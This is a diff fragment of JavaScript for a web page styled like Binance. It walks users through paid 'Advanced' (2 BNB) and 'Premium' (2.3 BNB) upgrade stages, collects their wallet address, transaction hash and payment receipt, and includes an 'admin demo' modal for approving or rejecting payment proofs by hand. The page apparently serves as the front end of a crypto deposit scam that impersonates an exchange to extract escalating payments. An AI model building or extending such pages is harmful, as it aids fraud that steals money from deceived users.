+            document.getElementById('header-stage-badge').innerHTML = `ADVANCED UPGRADE <span class="text-binance-textMuted font-semibold text-[9px] sm:text-[11px] lowercase">(maximum)</span>`;
+            document.getElementById('deposit-bnb-amount').innerText = '2 BNB';
+            document.getElementById('summary-bnb-val').innerText = '2 BNB';
+
+            resetInputsAndForm();
+            updatePriceUI(window.lastBnbPrice, window.lastBnbChange);
+            goToStep(1);
+
+            showToast('Transitioned to Advanced Upgrade (2 BNB)', 'info');
+        }
+
+        function startPremiumUpgrade() {
+            currentStage = 'premium';
+            depositBnbAmount = 2.3;
+
+            document.getElementById('header-stage-badge').innerHTML = `PREMIUM UPGRADE <span class="text-binance-textMuted font-semibold text-[9px] sm:text-[11px] lowercase">(unlimited)</span>`;
+            document.getElementById('deposit-bnb-amount').innerText = '2.3 BNB';
+            document.getElementById('summary-bnb-val').innerText = '2.3 BNB';
+
+            resetInputsAndForm();
+            updatePriceUI(window.lastBnbPrice, window.lastBnbChange);
+            goToStep(1);
+
+            showToast('Transitioned to Premium Upgrade (2.3 BNB)', 'info');
+        }
+
+        function resetInputsAndForm() {
+            document.getElementById('user-wallet-input').value = '';
+            document.getElementById('tx-hash-input').value = '';
+            document.getElementById('receipt-file').value = '';
+            document.getElementById('dropzone-prompt').classList.remove('hidden');
+            document.getElementById('file-preview-container').classList.add('hidden');
+        }
+
+        function openAdminDemoModal() {
+            document.getElementById('admin-modal').classList.remove('hidden');
+        }
+
+        function closeAdminDemoModal() {
+            document.getElementById('admin-modal').classList.add('hidden');
+        }
+
+        function adminAction(type) {
+            closeAdminDemoModal();
+            if (type === 'approve') {
+                triggerAdminApprovalNow();
+            } else if (type === 'reject') {
+                showToast('Admin rejected the submitted proof. Please re-check TxHash.', 'error');
+                goToStep(2);
+            }
+        }
+
+        function resetToInitialState() {
+            if (redirectTimer) clearInterval(redirectTimer);
+            window.location.reload();
+        }
+
+        function showToast(message, type = 'info') {
+            const container = document.getElementById('toast-container');
+            if (!container) return;
+            const toast = document.createElement('div');
+            
+            let bgClass = "bg-binance-bgCard border-binance-border text-white";
+            let iconClass = "fa-solid fa-circle-info text-binance-yellow";
+
+            if (type === 'success') {
+                bgClass = "bg-binance-bgCard border-binance-green/50 text-white";
+                iconClass = "fa-solid fa-circle-check text-binance-green";
+            } else if (type === 'error') {
+                bgClass = "bg-binance-bgCard border-binance-red/50 text-white";
+                iconClass = "fa-solid fa-triangle-exclamation text-binance-red";
+            }
+
+            toast.className = `pointer-events-auto flex items-center space-x-3 px-4 py-3 rounded-xl border shadow-xl text-xs transition-all duration-300 transform translate-x-10 opacity-0 ${bgClass}`;
+            toast.innerHTML = `<i class="${iconClass} text-base shrink-0"></i><span>${message}</span>`;
+
+            container.appendChild(toast);
+
+            setTimeout(() => {
+                toast.classList.remove('translate-x-10', 'opacity-0');
+            }, 50);
+
+            setTimeout(() => {
+                toast.classList.add('translate-x-10', 'opacity-0');
+                setTimeout(() => toast.remove(), 300);
+            }, 3500);
+        }
+    </script>
+</body>
+</html>
